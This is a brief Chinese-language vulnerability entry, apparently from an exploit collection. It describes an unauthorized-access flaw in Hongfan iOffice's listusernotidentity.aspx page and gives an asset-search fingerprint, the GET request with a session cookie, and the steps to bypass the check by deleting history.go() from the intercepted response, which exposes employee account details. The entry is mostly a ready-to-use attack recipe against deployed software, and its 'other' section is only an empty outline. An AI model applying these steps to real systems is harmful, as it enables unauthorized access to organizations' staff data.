# 红帆iOfficelistusernotidentity存在未授权访问漏洞

- **系统**：红帆　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`app.name="红帆 iOffice"`
- **请求**：`GET /ioffice/Identity/listusernotidentity.aspx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=1a1cd045waqdktmokr3nhozw`

**请求体 / payload**
```

利⽤Burpsuite抓取数据包，将 返回包⾥的 history.go() 删掉后再放⾏，即可来到未授权⻚⾯，查\
看员⼯账号相关信息。\
```

**其他**
- 红帆iOffice listusernotidentity存在未授权访问漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 红帆iOffice